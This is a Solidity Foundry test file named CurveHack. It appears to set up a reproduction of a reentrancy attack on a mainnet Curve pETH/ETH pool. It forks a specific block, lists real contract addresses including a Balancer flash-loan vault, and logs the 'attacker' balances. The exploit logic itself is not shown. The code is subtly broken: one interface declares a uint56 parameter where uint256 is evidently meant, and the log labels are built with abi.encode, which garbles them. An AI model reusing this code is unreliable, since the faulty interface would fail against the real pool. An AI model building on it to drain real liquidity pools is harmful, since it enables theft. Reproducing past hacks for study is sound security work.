pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract CurveHack is Test {
    IBalancerVault BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ICurvePool CurvePool = ICurvePool(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    IWETH WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 pETH = IERC20(0x836A808d4828586A69364065A1e064609F5078c7);
    IERC20 LPToken = IERC20(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);

    bool addLiquidityInReentrancy = true;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_806_055);
    }

    function logValues(string memory key) internal {
        emit log_named_decimal_uint(
            string(abi.encode(key, ": Curve LP Total Supply")), LPToken.totalSupply(), LPToken.decimals()
        );

        emit log_named_decimal_uint(string(abi.encode(key, ": Curve ETH Balance")), CurvePool.get_balances()[0], 18);

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Curve pETH Balance")), CurvePool.get_balances()[1], pETH.decimals()
        );

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Attacker LP Balance")), LPToken.balanceOf(address(this)), LPToken.decimals()
        );

        emit log_named_decimal_uint(string(abi.encode(key, ": Attacker ETH Balance")), address(this).balance, 18);

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Attacker pETH Balance")), pETH.balanceOf(address(this)), pETH.decimals()
        );

        emit log("=====================================================");
    }
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface ICurvePool {
    function get_balances() external view returns (uint256[2] memory);

    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);

    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);

    function remove_liquidity(uint56 token_amount, uint256[2] memory min_amounts) external;
}
